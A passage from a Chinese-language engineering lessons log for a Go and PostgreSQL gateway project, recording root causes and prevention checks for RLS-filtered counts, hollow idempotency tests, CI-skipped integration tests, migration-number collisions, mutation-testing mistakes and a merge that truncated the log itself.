     是**两种不同的问题**（后者多数是 `bak_20260920_*` 人工备份表）⇒ 混在一起会淹掉重点。
- 证据：`docs/audit/2026-10-21-R60-新装缺列族.md` §2。
- 溯源：R60 轮（2026-10-21）。

## 2026-10-20 — 判「某表有没有数据」前，先排除三种「0 行」成因（Seen: 2/3）
- 场景：memora 的 `memory` 表，同一轮里两次读数分别是 **0 行**与 **19 行**。差异不在数据，在**读法**。
- 根因与通式：`memora` 的表开 `FORCE ROW LEVEL SECURITY` ⇒ **不钉租户 GUC 的 `count(*)` 恒返 0**；
  正确读法是 `SET app.tenant_id=…; SET app.current_tenant=…; SET app.project_id=…` 之后**带谓词**再数。
  同源第二条：`pg_stat_user_tables.n_live_tup` 对同一张表给出 **876**（陈旧估计），真实是 **0**。
  ⇒ **`count(*)` 返回 0 有三种成因（真空 / RLS 过滤 / 统计陈旧），必须三者排除后才能下结论。**
- 防复发检查：① 判「表为空」前先确认读法能穿过该表的隔离策略（RLS / 分区 / 视图安全栏）；
  ② 优先用**精确** `count(*)`（带谓词）而不是 `pg_stat` 估计；③ 同一张表**用两种读法各数一遍**，不一致时先怀疑量具；
  ④ 审计报告里凡是「某表 0 行 ⇒ 某能力是空的」这类推论，必须在报告里写明**读法**。
- 证据：本轮审计员按无 GUC 读法报「live `memory` = 0 行 ⇒ 记忆落库是空的」；按 GUC 读法实测 **19 行**
  （`memory-bank` 19 个条目 + `memory_ingest_receipts` 19 行，outcome 全 `accepted`）⇒ 该结论被订正。
  `pg_stat_user_tables` 同表 `n_live_tup=876` 而真实 0。
- 溯源：三项目会话治理轮 §5.4。

## 2026-10-20 — 「幂等」类断言必须落在**可观测的最终状态**上，不能落在「调用了几次」上（Seen: 1/3）
- 场景：asr 的 A-4 头条主张「重复分析**不**产生重复关联」，判据 `TestInferIsIdempotentOnReanalysis` 全绿。
- 根因：判据断言的是**对 `fakeLinker` 发起了两次写**（`internal/projectinfer/producer_test.go:269`）⇒ 证明的是**写次数**，不是**行数**；
  真正的「不产生重复行」只存在于注释里（`producer_test.go:266-268`）。把 `internal/taskdomain/repository.go:680`
  的 `ON CONFLICT` **整个删掉**（重分析会真的写出第二行 `task_sessions`）⇒ `projectinfer`/`taskdomain`/`taskapi`
  **三个包全绿** ⇒ 该主张**无守卫**。
- 防复发检查：① 「幂等 / 不重复 / 不产生重复行」类主张，判据必须断言**行数**或**唯一 id**，
  且该断言必须能在**真库**上跑（假实现只能测到「调用了几次」）；
  ② 判据用 fake 时，先问「这个 fake 能不能表达『重复写入后的状态』」——不能就是空壳；
  ③ 断言 `len(fake.calls) == 2` 与断言 `len(fake.rows) == 1` 是**两件事**，后者才是不重复。
- 证据：二轮审计变异 A4（`DO UPDATE`→`DO NOTHING`）与 **A5（删掉整个 `ON CONFLICT`）**：`ok internal/projectinfer 3.017s`
  / `ok internal/taskdomain 29.872s` / `ok internal/taskapi 14.909s` ⇒ **全绿**；修法是加真库回读
  `SELECT count(*) FROM task_sessions WHERE session_id=$1 == 1`。
- 溯源：三项目会话治理轮 §5.2（A4/A5 行）、§5.3（A-F1）。

## 2026-10-20 — CI 不跑的文件里的判据 = **没有判据**（Seen: 1/3）
- 场景：memora M-1 的验收标准是「重放 ⇒ 409 且**不产生新行**」——这是整轮 P0 最关键的保证（它让摄取可重试）。
- 根因：守卫它的 `internal/sessionanalysis/store_integration_test.go:1` 是 `//go:build integration` 且需
  `KX_INTEGRATION_PG=1`；而 `.gitlab-ci.yml:190-193` 的 `rls-isolation-tests` 作业**只跑** `./internal/kbmigrations/...`
  与 `./internal/p3/...`，`.github/workflows/ci.yml:20-21` 的 `go test -race ./...` **不带 tag** ⇒ **该文件被跳过**。
  ⇒ 这条保证**在 CI 上从未被机器检查过**。另有一个更隐蔽的变体：`internal/v2` 的单元判据用**自己就返回该错误**的
  假后端（`internal/v2/session_analysis_test.go:177`）⇒ 只测到「错误→409」的映射，**测不到真回执检查**（变异 M5c 全绿）。
- 防复发检查：① 新增判据后**立刻查它是否在某个 CI 作业的运行列表里**；`//go:build` 标签 ⇒ 逐个 CI 配置确认；
  ② 关键保证要有**一条不需要外部依赖（DB/Redis/Docker）就能跑**的单元级守卫；
  ③ 单元级守卫不许用「自己返回期望错误」的假后端 —— 那测的是映射不是逻辑。
- 证据：二轮审计 M5c 变异（破坏回执检查）⇒ `ok internal/v2 0.702s` **全绿**；
  `.gitlab-ci.yml:190-193` / `.github/workflows/ci.yml:20-21` 两处配置实读。
- 溯源：三项目会话治理轮 §5.2（M5c 行）、§5.3（M-F1、M-F3）。

## 2026-10-20 — 跨仓契约**只有消费方** = 契约未闭合（Seen: 1/3）
- 场景：memora 建好了 `POST /api/v2/session-analysis`（契约、幂等键、落域、中间件齐备），asr 与网关都「看起来接上了」。
- 根因：memora 自己在 `internal/sessionanalysis/payload.go:40-45` 写明「网关目前**没有**任何代码调用 memora 的 v2 面……
  因此本包是**契约就位**」；二轮审计 grep 证实 asr 与网关里**都没有生产者**。
  连带查出形状级不匹配：网关 `WorkTypes []Classification{Value,Source,Confidence}` vs memora `[]string` ⇒ **整个载荷 422**；
  网关的 `Features` 与 memora 的 `Tags` **结构完全同形** ⇒ 会**静默贴错标签**；memora 必填 `dispatch_id` 而生产方没有该字段。
- 防复发检查：① 跨仓契约落地时，**先落消费方不等于契约完成** —— 必须同时落**生产方**或明确写下「本仓只做消费方」；
  ② 契约形状以**生产方的权威结构**为准（本轮是网关 `domains/analysis/sessionmeta/extractor.go:53` 的 `Result`），
  消费方**照抄生产方的形状**，不要自己另发明一套；
  ③ 字段名相同 ≠ 语义相同：`tags` 与 `features` 结构同形但含义不同 ⇒ **静默贴错标签**比报错更坏；
  ④ 生产方没有的必填字段，要么改成可推导，要么从入参拿。
- 证据：`memora/internal/sessionanalysis/payload.go:40-45,148,152,214` vs 网关 `domains/analysis/sessionmeta/extractor.go:53,69,104-109`。
- 溯源：三项目会话治理轮 §5.3（C-F1、C-F2）。

## 2026-10-20 — 「停写门」的**代码默认值**与**部署配置事实**是两回事（Seen: 1/3）
- 场景：上一轮结论写「`request_log` 双写**已下线**」；本轮对照代码发现**代码默认仍开着**。
- 根因：`settings/spec_storage.go:118-125` 声明 `storage.request_logs_write_enabled` 的 `Default: true`，
  访问器 `settings/key_request_logs_write_enabled.go:34` 在 store 未初始化时**也回退 `true`**
  ⇒ 任何**未显式配置**该键的环境（新装 / 克隆 / 灾备）**继续双写**。
  上一轮的真库「0 行」是**某台机器的 settings_kv 配置事实**，不是代码事实。
- 防复发检查：① 「已下线 / 已开启 / 已切换」这类**状态主张**必须分三层写清：
  **代码默认值** / **部署配置** / **真库实测**，三者任一不同 ⇒ 主张不成立；
  ② 判「某开关在某环境生效」时，**先看代码默认**，再看部署配置；只看部署配置会把「单机事实」当「代码事实」；
  ③ 改这类默认值前先查**启动期校验**：默认改了可能让**未配置的环境拒绝启动**
  （本轮：`ValidateSessionWriteState` ⇒ `ErrNoRequestWriteSource`）—— 这是**响亮失败**，但必须把「可接受配置」写对。
- 证据：`settings/spec_storage.go:118-125`、`settings/key_request_logs_write_enabled.go:34`；
  顺带修掉启动期错误消息里**点名了不存在的环境变量**、且宣传的「V2-only」配置**会被自己的校验拒绝**这两处真缺陷
  （`cmd/gateway/session_write_safety.go`）。
- 溯源：三项目会话治理轮 §2 D0。

## 2026-10-20 — **自造量具也要自检**：解析类脚本最容易在引号/续行上悄悄失效（Seen: 1/3）
- 场景：自写跨仓路由核对脚本，判定「memora 47 个 gin 路由组 / 430 个叶子路由」；第一次跑却只解析出 **1 个组**。
- 根因：bash 里 `$(...)` 赋值 + `sed` 的引号/续行在 macOS **bash 3.2** 下把提取结果打成了空/单行；
  脚本当时**没有自检**，差点把「量具坏了」当成「代码坏了」。
- 防复发检查：① 任何**解析类**量具（grep/sed/awk/正则提取）必须带**自检段**：
  对**已知必然存在**的若干对象断言能解析出来，自检不过 ⇒ 先信量具坏；
  ② 「解析结果为空」与「目标不存在」必须可区分 —— 前者先查量具；
  ③ 复杂字符串处理优先换语言（python3）而不是在 bash 里跟引号较劲。
- 证据：改写后自检段 4 条已知路由全部解析成功，基线正确报出 `/product/add`、`/product/search` 两条**memora 并不存在**的路径
  （= 本轮 D1 的直接证据）；修复后同一脚本判 `RESULT: PASS`。
  ⚠️ 另一处同源教训：**实现方自己写的核对脚本不能给自己打分** —— 审计方另写一份**逻辑不同**的脚本（独立提取 + 独立判据）复核。
- 溯源：三项目会话治理轮 §5.4 前后。

## 2026-10-20 — 量具报 FAIL 时先证明**量具没坏**：锚点错位会批量造假 FAIL（Seen: 1/3）
- 场景：为 G-2（网关 → memora 会话分析投递）另写跨仓契约核对脚本，首跑报 **28 条 FAIL**，
  读起来像「网关载荷字段全都不被 memora 认」。
- 根因（两处都是量具侧，代码没问题）：
  ① **锚点错位**：脚本用「文件里出现 `project_id`」来找 memora 的请求体结构 ⇒ 命中的是
  `internal/sessionanalysis/gateway_payload_test.go`（测试夹具）与 `internal/worker/tasks.go` 的
  `DreamCyclePayload`（`project_id`/`user_id`/`force`）⇒ 拿一个**不相干**的字段集当契约基准，
  于是网关的 26 个字段全部「多发」。
  ② **正则方向错**：`payload.Features = append(...)` 的**源**（`range result.Features`）在 append **之前**，
  而脚本按「append 之后」找 ⇒ 报「网关没把 Features 映射到 payload.Features」；
  同一段还把 `[^)]*` 用来跨 `append(...)`，结果被 `strings.TrimSpace(f.Key)` 的 `)` 提前截断。
  第三处：`DeriveDispatchID` 定义在 `internal/sessionanalysis/payload.go:358`，脚本只读了 `parse.go`。
- 防复发检查：
  ① 契约/结构类量具的**锚点必须写死到「文件 + 类型名」**，不要用「字段名出现即命中」这种模糊匹配；
  ② 量具的**失败输出必须能区分「量具坏了」与「代码坏了」** —— 解析到的结构名、字段集要**打印出来**供人眼核对；
  ③ 量具要**参数化输入根目录**（本轮 `GW_ROOT` / `ME_ROOT`）⇒ 可以在**副本**上施加变异来证明它不是恒绿，
     而不必污染真实工作树；
  ④ 「量具报 N 条 FAIL」时，**先看 N 是不是大得离谱**（28 条「全字段多发」是典型的锚点错位信号）⇒ 先查量具再改代码。
- 证据：修正锚点与窗口后基线 `RESULT: PASS`（顶层字段集合两端**完全一致**、10 组嵌套结构字段**零差异**）；
  随后在副本上施加两个变异：MUT-1「features 静默落进 tags」⇒ 量具红 2 条
  （`网关未把 Result.Features 映射到 payload.Features` / `网关把 features 静默贴进 tags`），
  MUT-2「网关多发 `bogus_field`」⇒ 量具红 `网关多发顶层字段 bogus_field` ⇒ **量具可被证伪**。
- 溯源：三项目会话治理轮 §6（G-2 独立复验）。

## 2026-10-20 — 多仓并发时 `origin/main` 会**持续前移** ⇒ 合并基线必须每次重取（Seen: 1/3）
- 场景：三仓同机各有并发会话在推 `main`。本轮网关的 `origin/main` 在**同一轮内前移了 3 次**，
  第一次合并的基线 `10bde2b6d` 在准备推送时已变成 `a6cec1f0e`；memora 前移 8 个提交、asr 多次前移。
- 根因：并发会话各自把 `main` 直推远端 ⇒ 本地 `main`/`origin/main` **随时**在动。
  若按「上次 fetch 时的基线」建 integration 分支再推，就会**覆盖掉别人的提交**，
  或推上去时才发现基线已过期 ⇒ 合并要重做、验证要重跑。
- 防复发检查：
  ① **每次合并/推送前**都 `git fetch origin` 并读 `git rev-list --left-right --count origin/main...HEAD`，
     确认「远端没有前移到我之上」；
  ② integration 分支**永远从最新 `origin/main` 重建**（`git checkout -B integrate/<name> origin/main`）
     再 `git merge --no-ff <feature>`，不要在旧基线上继续叠；
  ③ 合并后**必须重跑** `go build ./...` 与相关包测试 —— 基线变了，之前的绿**不再作数**；
  ④ 推送用 `git push origin <integration>:main`（不要 `git checkout main`）——
     `main` 常被别的 worktree 占用（本轮 memora 的 `main` 被 `memora-a7-wt` 占用）。
- 证据：本轮网关合并 G-2 时的实测：`git rev-list --left-right --count origin/main...HEAD` 先是 `3 1`
  （落后 3 / 领先 1）⇒ 重新 `checkout -B` 到 `a6cec1f0e` 后无冲突合并，build RC0、包测试全绿。
- 溯源：三项目会话治理轮 §6（推送收尾）。

## 2026-10-21 — 补「无消息」的失败清单：**提取器要按 `=== RUN` 块取，不是按 `--- FAIL:` 行前一行（Seen: 1/3）
- 场景：R59 的真库失败清单里 10 条是「(无消息)」⇒ 交接时只能写「消息未取全，下一轮补齐」。
- 根因（两处叠加）：① `go test` 的失败消息在 **`=== RUN <name>` 块内部**，
  `--- FAIL: <name> (0.66s)` 行只是**汇总标记**（且带时长后缀 ⇒ 按「行尾等于用例名」匹配也会漏）；
  ② R59 的提取器取「`--- FAIL:` 行**前一行**」⇒ 对「消息在块内」的包**必然取空**。
- 防复发检查：
  ① 提取失败消息时**按 `=== RUN` 分块**，在块内找 `Error:` / `Received unexpected error:` 的**下一行**
     （那才是具体错误，`Error:` 那行是空的）⇒ 本轮 10 条一次全取到；
  ② 「(无消息)」本身就是**量具坏了的信号**——它不是「这条失败没有原因」；
  ③ ★ **量具失效时先怀疑提取器，再怀疑被测对象**：本轮 10 条「无消息」里
     1 条是 C 类真缺陷、2 条是「缺列族」、3 条是夹具/测试形态 ⇒ ⇒ **一条都不能当「已知」跳过**。
- 证据：`docs/audit/2026-10-21-R60-新装缺列族.md` §9.1 的归类表。
- 溯源：R60 轮（2026-10-21）。

## 2026-10-21 — 「台账记『已应用』」≠「生产跑的是仓里当前那份字节」（Seen: 1/3）
- 场景：查一个外键违规时，发现生产 `public.handoff_pending_confirmations`
  **只有 PK + CHECK，没有那条 FK**；而迁移 517 在台账里记着「已应用（2026-08-16）」。
- 根因（三个读数串起来）：台账记的号 = 517；生产应用日 = **2026-08-16**（= `076a8ebc1` 那次提交）；
  而**建 FK 的动态 DO 块**是 `37099db23`（**2026-10-11**）才加进去的
  ⇒ ⇒ **同一个迁移号、两份不同字节，生产跑的是旧的那份**
  ⇒ ⇒ 而且**因为已记账，迁移不会重跑** ⇒ ⇒ **缺口在生产上永久存在**（不是「等下次部署就好」）。
- 防复发检查：
  ① 遇到「生产缺某个约束/索引/列」时，**先查台账**；台账说「已应用」**不构成闭环**
     ⇒ 要把「台账行」与「生产上的对象」**并排**读；
  ② 读台账时**顺带读 `applied_at`**，并与「该文件最后一次改动」的日期比
     ⇒ **文件改动日 > applied_at ⇒ 生产跑的是旧字节**（本轮就是靠这两个日期定位的）；
  ③ ⇒ **凡是「改过迁移文件」的提交，都要问一句「已部署的机器上这一条变了吗」**
     ⇒ 已记账的迁移**不会**自动重跑 ⇒ ⇒ 改迁移文件 = 需要一次显式的补动作。
- 证据：`docs/audit/2026-10-21-R60-新装缺列族.md` §10 的三读数表。
- 溯源：R60 轮（2026-10-21）。

## 2026-10-21 — 「红在哪」不等于「谁错了」：先回到**契约原文**再判归属（Seen: 1/3）
- 场景：R60 轮同时遇到三条「看起来像产品缺陷」的红 ⇒ 逐条回到契约原文后，**两条不是产品缺陷**。
- 三个形态：
  ① `tests-integration` 的 22P02（空 digest 写进 jsonb）：`TurnRecord.DigestJSON` 的
     **注释原文**写明「生产侧不会踩到：唯一赋值点永不为 nil」⇒ ⇒ **是测试没满足被记录的前置**；
  ② `domains-hooks-handoff` 的 23503（外键违规）：迁移 517 建 FK 时**目标表是动态的**
     （`handoff_logs_hot` 存在就指它），而**产品**写的正是 hot 表 ⇒ ⇒ **是测试插错了父表**；
  ③ `fault` 的 `cannot scan NULL into *string`：**契约里没有写**（列可空、字段是非指针 string）
     ⇒ ⇒ **这条才是真缺陷** ⇒ 且**已在生产生效**。
- 防复发检查：
  ① 判「产品缺陷 vs 夹具/测试形态」时，**先找契约原文**（字段注释 / 迁移注释 / DDL 注释），
     别凭「哪种更常见」下判断；
  ② ★ **契约里没写 ⇒ 那就是真缺陷**（不是「测试没按规矩来」）；
  ③ 归属判错会**改错东西**：把测试当产品改，会把一条契约悄悄改掉而不自知。
- 证据：`docs/audit/2026-10-21-R60-新装缺列族.md` §9.2~§9.5。
- 溯源：R60 轮（2026-10-21）。

## 2026-10-21 — 「装完」≠「装完能用」：量库之前先问**产品启动时还会改什么**（Seen: 1/2）
- 场景：R60 轮断言「installer 新装出来的库比生产少 23 个列」⇒ R61 轮复核（自己上一节的结论也要复核）
  ⇒ ★ **那 23 条里 20 条是伪缺口** ⇒ 真缺口只剩 D1 修掉的那条。
- 根因：量的那个库是「**装完、ensure 链没跑**」的一次性库；
  而产品**启动时**的 ensure 链（`db.Open`）会自己 `ADD COLUMN IF NOT EXISTS` 补掉那 20 列
  （standard_iq 三列 / credentials 三列 / provider_catalog 三列 / outbound_body / session_turns.host,tags）。
- 防复发检查：
  ① ★ **量「装出来的库」时，oracle 必须是「装完 **且启动过**」的形态**
     ⇒ 判据要能证明「ensure 链跑过」（本轮用 `models_canonical.standard_iq` —— 只有 ensure 会加它）；
  ② ★ **量具自检要写进门里**：oracle 形态不对 ⇒ **显式 SKIP 并说理由**，而不是给一个失真读数；
  ③ ⇒ **「装完能开库」与「装完能用」是两件事**：前者只验 ensure 链能跑完，后者才验列齐不齐。
- 证据：handoff §十九 §19.3（一次性库列数 8965 → 9245 的实测差）。
- 溯源：R61 轮（2026-10-21）。

## 2026-10-21 — **门绿不等于量具有牙**：解析面/口径/分支，三处都能让门「恒绿」（Seen: 1/2）
- 场景：R61 轮把 R60 那道缺列门拆开复核 ⇒ 连中三枪：
  ① **解析面**：只认 `ALTER TABLE … ADD COLUMN` ⇒ `CREATE TABLE IF NOT EXISTS` 形状
     （表已存在 ⇒ **整段静默空操作** ⇒ 登记了、跑了也加不上列）一条都看不见 ⇒ **缺口被漏**；
  ② **注释未剥离**：解析器把 `-- so the admin can replay` 的第一个词当成了列名
     ⇒ 实测多出 100+ 条幽灵列（含 `approval_queue.so`）⇒ **缺口被凭空放大 7 倍**；
  ③ **变异放错分支**：把 DROP COLUMN 插进 `if err != nil {` 的函数体里 ⇒ ensure 成功时根本不执行
     ⇒ 门照样绿 ⇒ ⇒ **编译红不算变异验证，「真改语义」也不等于「放对分支」**。
- 防复发检查：
  ① ★ **「删一行看门是否红」是解析面/覆盖面的唯一直接探针** —— 门绿只说明「登记册覆盖了测到的缺口」，
     不说明「测到的就是全部」；
  ② ★ **写 SQL 解析器必须剥注释**（`--` / `/* */`），并按**括号深度**切列表项；
  ③ ★ **抽出来的东西要抽查来源**（本次靠「一条幽灵列 approval_queue.so」顺藤摸瓜）；
  ④ ⇒ **量具自曝的两种形态**：一是**读数异常偏大**（幽灵列），二是**读数恒定/恒绿**（解析面没覆盖）。
- 证据：handoff §十九 §19.4~§19.5（17 行 → 147 行 → **20 行** 的三次读数 + M1/M2 变异）。
- 溯源：R61 轮（2026-10-21）。

## 2026-10-21 — 登记册必须**可重算**：手抄的清单不会在口径变化时叫醒任何人（Seen: 1/1）
- 场景：R60 的登记册是手工写死的 17 行；口径一换（装完 → 装完+启动）它**一声不响地过期**，
  而门因为「登记册覆盖了测到的缺口」照样绿。
- 防复发检查：
  ① ★ 登记册要带 `-update`（从真库读数**重生成**）⇒ 口径变了重跑一次即可；
  ② ★ 但重生成会**冲掉人的判断** ⇒ 人工结论写成**覆盖行**（注释行，重生成时保留并应用）；
  ③ ★ **生成器要快**：本轮第一版「每列重扫全仓」实测跑了几分钟没结束 ⇒ 改成
     **一次分词建「标识符 → 文件」索引**后 3.9s ⇒ ⇒ **跑得慢的门没人跑**。
- 证据：`sql/schema/fresh_install_column_gaps_test.go`（`-update` + `gapReadOverrides` + `gapBuildRepoIndex`）。
- 溯源：R61 轮（2026-10-21）。

## 2026-10-20 §143.29 轮 — 变异验证里「替换串包含 needle 作为子串」= **量具坏了**，不是门坏了（Seen: 1/3）
- 场景：§143.29 的文档门（`scripts/ursmcheck/section_14329_physical_read_test.go`，11 条）
  跑变异验证，**M1 / M25 两条「仍绿」** ⇒ 按门判据，替换掉
  `shared_blks_read` / `pg_buffercache` 后门应当变红，但它没红。
- 根因（一行）：★ **替换串把 needle 当子串包含了** ——
  `shared_blks_read` → `x_shared_blks_read`（**`shared_blks_read` 仍在里面**），
  `pg_buffercache` → `pg_buffercacheX`（**同理仍在里面**）
  ⇒ ⇒ 门是 `strings.Contains` 型 ⇒ 断言照样成立 ⇒ ⇒ **门其实有守卫力，是变异没真正删掉读数**。
- 防复发检查：
  ① ★ **「变异后门仍绿」的第一反应是「量具错了」，不是「门坏了」**（本仓已有的同族纪律
     「0 命中的第一嫌疑是量具坏了」在变异场景的形态）；
  ② ⇒ **写变异时，替换串必须与 needle 不存在子串关系**（`shared_blks_read` → `shared_blk_read`、
     `pg_buffercache` → `pg_cache_bufer`，**而不是加个前缀/后缀**）；
  ③ ★ 叠加本仓已有的「`Contains` 型门只保护『至少有一处』」纪律 ⇒ **两条要一起做**：
     **替换串不含 needle**（量具侧）**且**替换掉 needle 的**全部出现**（作用域侧），
     缺任何一条都会得到「假绿」；
  ④ 复验时**保留首轮的失败记录**（M1/M25 首轮仍绿 = 量具坏了）⇒ 这本身就是要写进交接的证据。
- 证据：§143.29 变异 M1~M28 首轮 26/28 ⇒ 修替换串后 **28/28 全红且按预期红**、runbook md5 逐字还原。
- 溯源：llm-gateway-go4 §143.29 轮（2026-10-20）。

## 2026-10-20 — ★ 自己新建的迁移编号，可能与**并进来的上游编号**撞车（Seen: 1/3）
- 场景：本轮把「v1 族真删」编为 885、把会话族负成本索引编为 886；
  合并 `origin/main`（59 个提交）时发现**上游已占用 885~889**
  （`session_turns_host_tags` / `session_bodies_storage_comment` /
  `session_turns_search_text_fts` / `session_family_join_index_gaps` /
  `session_turns_tools_population`），且**已随 154 的 2765 部署**。
- 根因：迁移编号是**全局唯一**的资源，而本分支的编号是基于**合并前**的 main 选的；
  上游在并行期继续往下编号 ⇒ 两条分支的编号空间**相交**。
  撞号的后果不是「编译失败」，而是**两个不同迁移共用一个编号** ⇒
  台账/清单/通道数组里出现两行同号、审计文档指代错对象。
- 防复发检查：① 任何「本轮新增编号」的决策，都要在**合并前**先看一遍远端最新编号；
  ② 合并后第一件事是**核编号占用**（`git ls-tree origin/main sql/migrations/startup/` 排序取最大号）；
  ③ 已部署的编号**不可改** ⇒ 只能改自己的 ⇒ 改号要连带改全套登记：
  canonical + embeddata 两份文件、契约门文件名与测试名、installer's go:embed + map +
  `StartupFiles` + **TSV 清单（用 `-update` 重生成，别手改）**、部署通道 `files=()`、
  changelog 登记行（**sha 要重算**）、散文编号；
  ④ 改号只动编号、不动内容 ⇒ 但**幂等性必须重测**：
  本地那条部署记录用的是旧文件名 ⇒ 通道下次会**再跑一次**新编号的文件
  ⇒ 在「旧编号已应用」的库上重跑一次，确认不报错（实测：890 在 v1 已删的库克隆上 EXIT=0）。
- 证据：`sql/migrations/startup/890_drop_request_logs_v1_family.sql`（原 885）、
  `891_session_turns_cost_negative_partial_idx.sql`（原 886）、TSV 重生成后 294 条、
  新装链门 0 of 294 fail、893/891 幂等实测（克隆库重跑 EXIT=0）。
- 溯源：request_logs→session_turns 复核轮 §6.15；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §6.15。
## 2026-10-21 — 「文件存在 ≠ 迁移会运行」不止是**列**：**分区与函数**同样是资产（2026-10-21 实测，llm-gateway-go R61 §19.7）
- 场景：R60/R61 沿着「文件存在 ≠ 迁移会运行」这条线查列缺口 ⇒ ★ 顺藤摸瓜挖到**第三个实例**，
  而且后果最重：**新装库没有当月分区** ⇒ 核心写路径（session_turns / sessions / usage_ledger /
  routing_decision_log 等 15 个 RANGE 族）**直接 23514**（已实测复现）。
- 根因：运行期靠 `bg/partition_manager.go` 每 24h 调 `ensure_<表>_partition()` **SQL 函数**
  来建当月/次月分区 ⇒ 而**这 11 个函数的来源迁移在 installer 链里全部未登记**
  ⇒ ⇒ 新装库**既没有函数、也没有当月分区** ⇒ 装完即坏、且运行期也救不回来。
- 防复发检查：
  ① ★ **别只查「列」**：资产有三类 —— **列 / 表 / 分区与函数**；
     「装完能不能跑」要按这三类分别验 ⇒ ★ **用一条真实写入验**（本次就是一条 INSERT 报 23514）；
  ② ★ **「登记旧文件」不一定可行**：本次 `473` 在新装库上**直接失败**（引用 S4 重命名前的表名），
     `330/334/335` 与既有对象冲突 ⇒ ⇒ **dated 补丁也解决不了「每个月都要」** ⇒ 正解是新建幂等迁移 + 登记；
  ③ ★ **当「测试侧补丁」是唯一能让红变绿的路时，先问「产品侧是不是真缺东西」**
     （R59 当时的处方「给 probe 脚本补当月分区」正是在给产品缺陷打掩护）；
  ④ ⇒ **阴性/轻量定性也要复核**：R59 把这 3 条 23514 定成「B 类夹具问题」⇒ 实际是 **C 类真缺陷**。
- 证据：handoff §19.7（一次性库 INSERT 实测 + 11 个 ensure 函数的来源/登记映射 + 试跑修法后 23514 消失）。
- 溯源：R61 轮（2026-10-21）。

## 2026-10-20 §143.30 轮 — 「PG 日志说 `statement timeout`」≠「被角色级超时杀了」（Seen: 1/3）
- 场景：§143.29 记下一个「矛盾」：某巡检查询「2 天被 `statement timeout` 杀 17 次」，
  **但** `pg_stat_statements` 里它有 26 次「成功」记录、均时 190 s
  ⇒ ⇒ 判为「两者不可能同时成立 ⇒ 必有两条调用路径」⇒ 列为待查项 P10。
- 根因（**两个未验证的假设叠出来**，不是一个错）：
  ① ★★★★★ **「被砍在 30 s」从来没量过** —— PG 日志只写
     `canceling statement due to statement timeout`，**它不写是哪一个超时生效**；
  ② ★★★★★ **「26 次成功」被当成了「另一条路径的调用数」** ——
     ★ **`pg_stat_statements` 只记成功语句** ⇒ **「26」是成功次数，「17~18」是失败次数**，
     ★ **它们本来就同时成立，根本不矛盾**。
- 实测（把客户端自己的日志当第三把尺子）：
  - 巡检脚本 `de()` 用 `PGOPTIONS=-c statement_timeout=${STMT_TIMEOUT}` **在连接建立时覆盖角色级**；
  - 部署备份逐字证明该值 10-04~10-20 00:14 恒为 **180 s**，10-20 00:31 才改成 **600 s**；
  - ⇒ **全部 124 次超时杀里最短的一次是 187 s，没有任何一次 < 180 s**
    ⇒ ⇒ **角色级 30 s 从未作用于此查询**。
- 防复发检查：
  ① ★★★★★ **凡是要写「被 X 秒的超时杀掉」，必须先回答「是哪一个超时」** ——
     ★ **有效值 = max(库级, 角色级, 会话级)，而【会话级会覆盖角色级】**；
     ★ **客户端自己 `SET`/`PGOPTIONS` 抬超时时，角色级的值完全失效**；
  ② ★★★★ **「pg_stat_statements 里的 calls」= 成功次数，不是调用次数** ——
     ★ **凡是要用它推「调用路径」的，必须先看被 timeout 杀 / ctx 取消的那部分**
     （§143.26.0 已记的盲区，本轮再次被它绊倒）；
  ③ ★★★★ **判据要配一个【实测 elapsed】**（客户端自己日志里的时间戳差），
     ★ **不能只靠日志里的那句错误文本**；
  ④ ★★★ **冲突时用「客户端自己的日志」当第三把尺子** ——
     ★ 本轮正是靠脚本日志（start → summary/ABORT 的时间差）把「26 vs 17」对齐成「23 OK vs 18 ABORT」。
- 证据：runbook `§143.30`；实测 124 次超时杀 min=187 s；pgss 26/190,473 ms/591,621 ms
  ↔ 脚本日志 23/202 s/603 s/18 次 ABORT。
- 溯源：llm-gateway-go4 §143.30 轮（2026-10-20）。

## 2026-10-20 §143.30 轮 — 变异脚本要**自检「替换串是否包含 needle 作子串」**（Seen: 1/3）
- 场景：§143.30 的门跑变异验证，**M10 替换 `PGOPTIONS` → `xPGOPTIONS` 后门仍绿**。
- 根因（一行）：★ **替换串 `xPGOPTIONS` 本身包含 needle `PGOPTIONS`**
  ⇒ ⇒ 门是 `strings.Contains` 型 ⇒ 断言照样成立 ⇒ ⇒ **门其实有守卫力，是变异没真正删掉读数。**
- 防复发检查：
  ① ★★★★ **在变异脚本里加一条前置断言**：`if needle in repl: BLOCKED`
     —— ★ **本轮已踩三次**（`x_shared_blks_read` / `pg_buffercacheX` / `xPGOPTIONS`）
     ⇒ ⇒ ★★ **同一个坑踩第三次 ⇒ 它就该由工具自动拦下，而不是靠人记住**；
  ② ★★★ 「变异后门仍绿」的第一反应仍然是**「量具错了」**，不是「门坏了」；
  ③ ★★ 叠加已有的两条纪律：**替换串不得含 needle 作子串**（量具侧）
     **且**替换掉 needle 的**全部出现**（作用域侧）—— 缺任一条都会得到「假绿」。
- 证据：`scripts/ursmcheck/section_14330_patrol_timeout_test.go` 配套变异脚本
  `/private/tmp/p14321/mutation_14330.py`（含 needle-in-repl 前置自检）；
  M1~M36 全红且按预期红。
- 溯源：llm-gateway-go4 §143.30 轮（2026-10-20）。

## 2026-10-20 §143.30 轮后 — 一次合并把 **194 条经验条目**静默蒸发（Seen: 1/1）
- 场景：本会话在 §143.30 轮提交后 `git rebase origin/main`，**LESSONS.md 报冲突**
  ⇒ 解析冲突时发现文件只剩 **11,517 bytes / 7 条**；而本会话提交前它是 **431,177 bytes**。
- 根因（**不是我的提交造成的**）：
  | 提交 | LESSONS.md | 条目数 | 说明 |
  |---|---:|---:|---|
  | `3a370af8d` | 429,302 B | **198** | 完整文件 |
  | `87952cc4a` | **5,683 B** | **4** | ★ **并行会话的合并提交把它整份换掉了** |
  ⇒ ⇒ ★★★ **该合并的提交信息写着「LESSONS.md 两侧全保留」⇒ 实际上没有保留** ——
  ⇒ ⇒ ★★ **提交信息不能替代文件内容核对**。
  ⇒ ⇒ ★★ **「解决冲突时保留两侧」也会失真**：真正的伤害发生在**合并**那一步，不在冲突解决那一步。
- 防复发检查：
  ① ★★★★★ **过程记录文件必须有【体量地板门】** ——
     ★ 本轮新增 `scripts/ursmcheck/process_record_guard_test.go`：
     `LESSONS.md` ≥ **190 条 / 400,000 bytes**，主 runbook ≥ **2,000,000 bytes**，
     且两者都不含合并冲突标记 ⇒ ★ **变异 M1~M4 全红且按预期红**（截断/只留 4 条/注入冲突标记都抓得住）；
  ② ★★★★ **冲突解决完必须核对【条目数】，不能只看「没有冲突标记」** ——
